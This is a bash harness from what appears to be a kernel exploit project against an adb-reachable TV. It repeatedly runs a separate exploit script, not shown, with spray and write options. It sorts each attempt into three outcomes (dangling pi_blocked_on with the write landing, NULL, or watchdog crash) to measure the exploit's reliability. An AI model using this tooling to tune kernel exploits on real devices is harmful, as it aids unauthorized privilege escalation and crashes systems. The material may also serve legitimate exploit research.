#!/bin/bash
# nullscan.sh - measure the three-way distribution of pi_blocked_on:
#               NULL / dangling / crash.
#
# Rationale, with --soft:
#   * pi_blocked_on non-NULL -> the sprayed prio opens the gate -> the chain runs.
#       offset correct -> write lands                   -> "dangling, hit"
#       offset wrong   -> "[7] ran but target unchanged" -> "dangling"
#   * pi_blocked_on NULL     -> the cbz returns early -> all rounds silent -> "NULL"
#   * watchdog reset         -> boot_id changes                          -> "crash"
#
# Usage:  DEV=<tv-ip>:5555 bash ghost/nullscan.sh [samples-per-bucket] [extra args...]
# e.g.    DEV=... bash ghost/nullscan.sh 6 --wto 300
#         DEV=... bash ghost/nullscan.sh 6 --rdelay 5000
set -u
: "${DEV:?set DEV=<tv-ip>:5555}"
ADB="${ADB:-adb}"
HERE="$(cd "$(dirname "$0")" && pwd -W 2>/dev/null || cd "$(dirname "$0")" && pwd)"
N="${1:-6}"; shift || true
EXTRA="$*"
OUT="$HERE/../logs/nullscan.log"
mkdir -p "$HERE/../logs"

bootid() {
  "$ADB" -s "$DEV" shell 'cat /proc/sys/kernel/random/boot_id 2>/dev/null' 2>/dev/null | tr -d '\r\n'
}
waitdev() {
  for i in $(seq 1 30); do
    "$ADB" connect "$DEV" >/dev/null 2>&1
    [ "$("$ADB" -s "$DEV" get-state 2>/dev/null | tr -d '\r')" = "device" ] && return 0
    sleep 10
  done
  return 1
}

echo "########## nullscan args[$EXTRA] samples=$N  $(date '+%H:%M:%S')" | tee -a "$OUT"
HOLE=0; NULLS=0; CRASH=0
for i in $(seq 1 "$N"); do
  waitdev || { echo "!! device unreachable, aborting" | tee -a "$OUT"; exit 1; }
  B0=$(bootid)
  O=$(bash "$HERE/run24b.sh" --walk --soft --ucoff 0x108 121 19 --rounds 1 $EXTRA 2>&1)
  B1=$(bootid)
  if echo "$O" | grep -q 'write-through OK\|ran but'; then
    HOLE=$((HOLE+1)); R="dangling OK"
  elif echo "$O" | grep -q 'all rounds missed'; then
    NULLS=$((NULLS+1)); R="NULL"
  elif [ -n "$B1" ] && [ "$B1" != "$B0" ]; then
    CRASH=$((CRASH+1)); R="crash"
  else
    R="? (no verdict line)"
  fi
  echo "  [$i/$N] $R  boot=${B0:0:8}->${B1:0:8}" | tee -a "$OUT"
done
echo "########## summary[$EXTRA]: dangling=$HOLE  NULL=$NULLS  crash=$CRASH  total $N" | tee -a "$OUT"
